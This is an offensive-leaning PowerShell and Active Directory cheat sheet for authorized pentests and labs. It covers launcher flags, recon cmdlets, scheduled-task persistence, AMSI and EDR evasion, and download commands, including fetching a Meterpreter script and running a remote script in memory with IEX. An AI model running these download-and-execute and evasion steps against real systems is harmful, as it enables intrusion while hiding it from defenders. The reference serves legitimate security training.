# Offense

## Windows Offense & PowerShell Tradecraft

> Offensive-leaning reference for working a Windows/Active Directory target from the command line: PowerShell fundamentals, a practical cmdlet/command cheat sheet, obfuscation & AMSI evasion, and host/AD recon and access tricks.
>
> Companion files: **Active Directory (AD).md** (the concepts behind the commands) and **Windows-Defense.md** (the event logs these actions generate - useful for knowing what you're lighting up).

***

### PowerShell fundamentals

> "PowerShell is a cross-platform task automation solution made up of a\
> command-line shell, a scripting language, and a configuration management\
> framework. PowerShell runs on Windows, Linux, and macOS."

PowerShell is both an interactive shell and a scripting language built on .NET.\
Because almost everything it touches is a .NET **object** (not plain text), you\
can pipe rich objects from one command to the next and filter on their properties

* a key difference from classic `cmd.exe` and most Unix shells.

You can launch PowerShell by:

* Searching for **PowerShell** in the Start Menu.
* Running `powershell.exe` from a command prompt.
* Pressing **Win + R** (run dialog) and entering `powershell.exe`.

**Windows PowerShell (5.1)** ships in-box on Windows and runs on .NET Framework;\
**PowerShell 7+** (the `pwsh` binary) is the cross-platform successor built on\
.NET Core. Offensive tooling often targets 5.1 because it is present by default\
on every Windows host.

Reference material from Microsoft:

* [Introduction to PowerShell (free course)](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/)
* [PowerShell scripting overview](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2)
* [about\_powershell\_exe](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)

### Execution arguments (launcher flags)

These flags control how `powershell.exe` starts. They appear constantly in\
offensive one-liners because they suppress friction (profiles, prompts, windows)\
and loosen execution restrictions. Most accept **partial names** as long as they\
are unambiguous (e.g. `-Exec` for `-ExecutionPolicy`), which is itself a mild\
evasion tactic against naive log parsing.

| Flag (short / long)                        | What it does                                                                                                                                                                    |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-NoP` / `-NoProfile`                      | Runs in the default PowerShell environment **without loading any PowerShell profile**, so profile scripts can't interfere (or log).                                             |
| `-NonI` / `-NonInteractive`                | Does not present an interactive prompt to the user.                                                                                                                             |
| `-W Hidden` / `-WindowStyle Hidden`        | Sets the window style - `Normal`, `Minimized`, `Maximized`, or `Hidden`. `Hidden` runs with no visible window.                                                                  |
| `-Exec Bypass` / `-ExecutionPolicy Bypass` | Sets the execution policy **for the current session only** (stored in `$env:PSExecutionPolicyPreference`). It does **not** change the machine's registry execution policy.      |
| `-Enc` / `-EncodedCommand`                 | Accepts a **Base64-encoded** (UTF‑16LE) command string. Used to submit commands that need complex quoting/braces - and, in offense, to hide the command from casual inspection. |

A canonical "stealthy launcher" therefore looks like:

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc <base64>
```

> Note: these flags reduce _friction and casual visibility_, not real telemetry.\
> `-Enc` payloads are trivially decoded, and the full command line is still\
> captured by Event ID **4688** / Sysmon **1** / PowerShell script-block logging\
> (**4104**). See **Windows-Defense.md**.

### Cmdlets and verbs

A **cmdlet** (pronounced "command-let") is a lightweight command used in the\
PowerShell environment. The runtime invokes cmdlets within scripts or at the\
command line; each performs an action and typically returns a .NET object to the\
next command in the pipeline. Cmdlets include binary (C#) cmdlets, advanced script\
functions, CDXML, and workflows.

Cmdlets follow a strict **`Verb-Noun`** naming convention (e.g. `Get-Process`,\
`Stop-Service`), which makes them discoverable even when you don't know the exact\
name. The two every operator should know first are:

* **`Get-Command`** - find available cmdlets, with pattern matching like\
  `Get-Command Verb-*` or `Get-Command *-Noun`. For example, if you want to\
  restart a service but don't know the cmdlet, you can guess it contains\
  "service" and search for it.
* **`Get-Help`** - show documentation and examples for a cmdlet.

Common approved verbs: `Get`, `Start`, `Stop`, `Read`, `Write`, `New`, `Out`.\
The full list of approved verbs is\
[here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7).

### PowerShell file extensions

| Extension | Purpose                                                                          |
| --------- | -------------------------------------------------------------------------------- |
| `.ps1`    | Executable PowerShell script.                                                    |
| `.psd1`   | Module **manifest** - a table of key/value pairs describing a module's contents. |
| `.psm1`   | PowerShell **module** file (the code a module exports).                          |

### Command cheat sheet

> Corrections applied while consolidating these notes (the originals had typos):\
> `Get-History` (not `Get-Histtory`), `Get-Content` (not `Get-Contents`), and\
> `(New-Object System.Net.WebClient).DownloadFile(...)` - the `.` before\
> `DownloadFile` is required.

#### Discovery & help

```powershell
Get-Help <Command-Name>        # Show help/examples for a cmdlet
Get-Command                    # List all cmdlets; supports Verb-* / *-Noun matching
Verb-Noun | Get-Member         # Inspect the properties/methods of a command's output
<command> | Format-List        # Show full detail of objects (one property per line)
dir | Format-List
```

The **pipe `|`** passes the output (objects) of one cmdlet into the next - the\
backbone of PowerShell composition.

#### Filesystem & content

```powershell
dir                            # List files in the current directory
dir /A:H                       # List hidden files
tree                           # Show the directory tree
tree /F                        # Show the directory tree including files
Get-Item <path>                # Retrieve a single object (file/registry key)
Get-ChildItem <path>           # List contents of a folder or registry hive
New-Item <path>                # Create a new item (file/dir/key)
Set-Item <path>                # Modify an item's value
Copy-Item <src> <dst>          # Copy an item
Rename-Item <path> <newname>   # Rename an item
Remove-Item <path>             # Delete an item
Get-Content <file>             # Display file contents (like `cat`)
Add-Content <file> <data>      # Append content to a file
Set-Content <file> <data>      # Overwrite a file's content
Clear-Content <file>           # Empty a file without deleting it
Compare-Object <a> <b>         # Compare two or more objects (and their contents)
Get-FileHash <file>            # Hash a file (e.g. for integrity / IOC checks)
Out-File <file>                # Save pipeline output to a file
Export-Csv <file>              # Export objects to CSV (often easier to read)
```

Examples:

```powershell
Get-Hotfix | Out-File Hotfixes.txt
(command) | Export-Csv out.csv
```

#### System & host info

```powershell
systeminfo                     # General system info (OS, patches, domain, etc.)
Get-Hotfix                     # Enumerate installed patches/updates
Get-Hotfix | Format-List | findstr InstalledOn
Get-Hotfix | Format-Table HotFixID
whoami /priv                   # Current user's privileges (look for abusable ones)
whoami /groups                 # Groups the current user belongs to
Get-History                    # PowerShell command history (this session)
doskey /history                # Command history in cmd.exe
```

> `Get-Hotfix` + `systeminfo` are classic first steps for **local privilege-**\
> **escalation** triage: compare installed patches against known kernel exploits.

#### Processes & services

```powershell
Get-Process                    # List running processes (-Name to filter)
Start-Process <name>           # Start a process, e.g. Start-Process notepad
sc query type= service         # List all services (note the space after type=)
sc start <service>             # Start a service
sc stop <service>              # Stop a service
```

#### Users & groups (local)

```powershell
Get-LocalUser                  # List local users
Get-LocalGroup                 # List local groups
New-LocalUser -Name "USER" -NoPassword          # Create a local user
Add-LocalGroupMember -Group "GROUP" -Member "USER"   # Add user to a local group

# Create a user and set a password interactively:
$Password = Read-Host -AsSecureString
Set-LocalUser -Name "USER" -Password $Password -Description "DESCRIPTION"
```

#### Modules & execution policy

```powershell
Get-Module -ListAvailable      # See available modules
Import-Module .\<file>         # Import a module (e.g. PowerView, an AD module)
Get-ExecutionPolicy            # View the current execution policy
Set-ExecutionPolicy <Undefined|Restricted|RemoteSigned|Unrestricted|Bypass>
```

> Execution policy is **not** a security boundary - it only governs running\
> `.ps1` files by the normal path. It is routinely sidestepped with\
> `-ExecutionPolicy Bypass`, piping a script into `IEX`, or `-EncodedCommand`.

#### Networking

```powershell
arp /a                         # Hosts that have recently contacted this machine
netdom query DC                # List the domain's Domain Controllers

# Active network adapters and their IPv4 addresses:
Get-NetAdapter | Where-Object {$_.Status -eq "Up"} |
  ForEach-Object {
    Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 |
      Select-Object InterfaceAlias, IPAddress
  }
```

#### Downloading files

`Invoke-Expression` (`IEX`) evaluates a string as a command and returns its\
result. Without it, a string at the command line is simply echoed back unchanged -\
which is why `IEX` is the usual way to execute a downloaded script **in memory**\
(no file touches disk).

```powershell
# Save to disk:
Invoke-WebRequest -Uri http://<IP>:<PORT>/<FILE> -OutFile <OUTFILE>
Invoke-WebRequest -Uri http://192.168.1.52:8000/test.txt -OutFile Downloaded.txt

(New-Object System.Net.WebClient).DownloadFile('http://10.0.2.8/meterpreter-64.ps1','meterpreter.ps1')

# Download and execute in memory (no file on disk):
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.52:8000/test.txt')
```

> `Invoke-WebRequest` sends HTTP/HTTPS requests and parses the response, returning\
> collections of links, images, and other HTML elements.\
> [Docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2).\
> The in-memory `DownloadString | IEX` pattern is heavily signatured by AV/AMSI -\
> see Obfuscation & AMSI evasion.

### Active Directory module

The AD PowerShell module (`Import-Module ActiveDirectory`, present on hosts with\
RSAT or on DCs) exposes the directory as cmdlets.

```powershell
Get-ADUser -Filter *                 # List all AD users
Get-ADUser -Identity <USERNAME>      # Look up a single user

# Create a new AD user:
New-ADUser -Name "USERNAME" -Surname "LASTNAME" -GivenName "FIRSTNAME" `
  -Office "Security" -OtherAttributes @{'mail'="USERNAME@DOMAIN"} `
  -AccountPassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true
```

> For heavier enumeration (ACLs, trusts, Kerberoastable accounts, etc.), operators\
> typically load **PowerView** rather than the stock module. See\
> **Active Directory (AD).md** for what these objects mean.

### Scheduled tasks (schtasks)

Scheduled tasks are a common **persistence** and **lateral-execution** mechanism.\
`SCHTASKS` manages them from the command line.

```
SCHTASKS /Query /V /FO list      # View all scheduled tasks (verbose, list format)
```

**Create** - at minimum you must supply `/create`, `/sc`, `/tn`, and `/tr`:

| Parameter | Description                                                                                     |
| --------- | ----------------------------------------------------------------------------------------------- |
| `/create` | Schedules a task to run.                                                                        |
| `/sc`     | Schedule type (per minute, hourly, daily, weekly, on logon, etc.). Check the available options. |
| `/tn`     | Task name - must be unique.                                                                     |
| `/tr`     | Trigger/action to run: an executable, script, or batch file.                                    |
| `/s`      | Host to run on (as in `/Query`).                                                                |
| `/u`      | Local or domain user to run as.                                                                 |
| `/p`      | Password for that user.                                                                         |
| `/mo`     | Modifier within the schedule (e.g. every 5 hours, every other day).                             |
| `/rl`     | Privilege level: `Limited` (default) or `Highest`.                                              |
| `/z`      | Delete the task after it completes.                                                             |

**Change** - modify an existing task:

| Parameter  | Description                      |
| ---------- | -------------------------------- |
| `/change`  | Modify existing scheduled tasks. |
| `/tn`      | The task to change.              |
| `/tr`      | New program/action to run.       |
| `/ENABLE`  | Set the task state to Enabled.   |
| `/DISABLE` | Set the task state to Disabled.  |

**Delete**:

| Parameter | Description                         |
| --------- | ----------------------------------- |
| `/delete` | Remove a task from the schedule.    |
| `/tn`     | The task to delete.                 |
| `/s`      | Name or IP to delete the task from. |
| `/u`      | User to run the task as.            |
| `/p`      | Password for that user.             |
| `/f`      | Suppress the confirmation warning.  |

> Task creation/changes surface in the logs (service/`7045`, task-specific IDs) -\
> again, see **Windows-Defense.md**.

***

### Obfuscation & AMSI evasion

Obfuscation means making something obscure - deliberately concealing code. It is\
used legitimately for IP protection, and offensively to hide the logic or values\
of a payload so that signature-based defenses don't recognize it. Obfuscated code\
is paired with a language-specific _d&#x65;_&#x6F;bfuscator (here, PowerShell itself) that\
turns it back into something runnable at execution time. This section covers ways\
malicious PowerShell is commonly hidden.

Reference: [Offensive Security – PowerShell Obfuscation](https://www.offensive-security.com/offsec/powershell-obfuscation/).

#### AMSI

The **Antimalware Scan Interface (AMSI)** is a Windows API that lets applications\
(such as anti-virus) scan content _in memory, right before it executes_ - closing\
the gap that pure on-disk scanning leaves open against fileless/in-memory attacks.\
Think of AMSI as an extra security checkpoint. It is not limited to AV; it is\
integrated into several Windows components:

* **User Account Control (UAC)** - elevation of EXE, COM, MSI, or ActiveX installs.
* **PowerShell** - scripts, interactive use, and dynamic code evaluation.
* **Windows Script Host** - `wscript.exe` and `cscript.exe`.
* **JavaScript and VBScript.**
* **Office VBA macros.**

The practical consequence: using common payloads unmodified - or running an\
outdated obfuscator whose output is already signatured - will very likely get\
flagged. Effective evasion generally **layers logic to hide the payload in plain**\
**sight**. The techniques below illustrate how launchers are generated and how the\
final result appears.

#### Base64-encoded commands

PowerShell can execute Base64-encoded commands directly from the command line via\
`-EncodedCommand` (often abbreviated `-Enc`; partial parameter names are allowed\
as long as they're unambiguous, which is common for this launcher). This is\
arguably the **most popular** approach - and also one of the **easiest to spot**\
in logs, because the encoded blob stands out.

Parameters recap (see Execution arguments\
for the full table):

* `-NoP` - don't load the PowerShell profile.
* `-NonI` - no interactive prompt.
* `-W Hidden` - hidden window.
* `-Exec Bypass` - session-only execution policy bypass.
* `-Enc` - Base64 (UTF‑16LE) encoded command.

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc 'Vy5yLmkudC5lLi0uTy51LnQucC51LnQuIC4iLkguZS5sLmwuby4gLlcuby5yLmwuZC4iLg=='
```

**Base64 expressions (in-script)**

Rather than encoding the whole launcher, you can decode and execute a Base64\
string **from within** a script:

```powershell
Invoke-Expression ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('Vy5yLmkudC5lLi0uTy51LnQucC51LnQuIC4iLkguZS5sLmwuby4gLlcuby5yLmwuZC4iLg=='))))
```

#### Compression

Compression obfuscation can help evade AMSI (sometimes) and makes a payload harder\
to deconstruct. A payload is compressed into a gzip object and then encoded so it\
can be embedded in the launcher; at runtime it is decompressed and decoded. The\
"sneaky" part is that a reviewer must know _how_ to decompress and decode it, or\
the embedded blob is unintelligible - and not everyone is comfortable enough with\
PowerShell to extract the intended payload by hand.

#### Payload reversing

Virtually anything that can be split into a character array can be **reversed** as\
a simple obfuscation layer. You see this most with Base64 strings, but reversed\
commands can also be stored directly within a payload and flipped back at runtime.

#### Tools & resources

* [Offensive Security – PowerShell Obfuscation](https://www.offensive-security.com/offsec/powershell-obfuscation/)
* [Invoke-Obfuscation (danielbohannon)](https://github.com/danielbohannon/Invoke-Obfuscation)
* [Invoke-PSObfuscation (gh0x0st)](https://github.com/gh0x0st/Invoke-PSObfuscation)

***

### Host & AD recon / access

Practical tricks for operating on and around a Windows/AD target.

#### Running without elevation prompts (RunAsInvoker)

If an executable is manifested to request elevation but doesn't strictly need it,\
the **`RunAsInvoker`** compatibility layer tells Windows to launch it with the\
_&#x63;aller's_ token instead of prompting for elevation - a handy way to run such a\
binary in a non-admin context. Create a `.bat` file containing:

```bat
SET __COMPAT_LAYER=RunAsInvoker
start <file>.exe
```

#### Offline AD recon with AD Explorer

[AD Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)\
is a **signed, legitimate Sysinternals EXE**. Use it to **snapshot the entire AD**\
**directory** and take the snapshot back for offline analysis - enumerate at your\
leisure without hammering the DC with live LDAP queries, and using a tool that is\
expected to be present in a Windows admin's kit.

If you want to work the snapshot in **BloodHound**, convert it with\
[ADExplorerSnapshot.py](https://github.com/c3c/ADExplorerSnapshot).

#### EDR evasion / where to run your tooling

* **Don't play the endpoint's game.** Rather than fighting EDR on the provided\
  Windows box, spin up **WSL** or install **VirtualBox**, or run **VS Code** on\
  the box with cloud **tunnels** to route your LDAP traffic in from your local\
  Kali box over Microsoft cloud IPs.
* **Best internal-network coverage:** use the provided Windows machine for testing\
  _&#x65;ndpoint_ security controls, but for everything else on the network -\
  including their AD - use a **separate device / VPN** inside their network so\
  your tooling isn't sitting under the target host's EDR.

> These are tradecraft notes for **authorized** engagements (pentests / CTFs /\
> labs). Operate only within your rules of engagement and scope.

***

### Resources

* [TryHackMe – Hacking with PowerShell](https://tryhackme.com/room/powershell)
* [TryHackMe – PowerShell for Pentesters](https://tryhackme.com/room/powershellforpentesters)
* [Microsoft – Introduction to PowerShell](https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/)
* [Microsoft – PowerShell scripting overview](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.2)
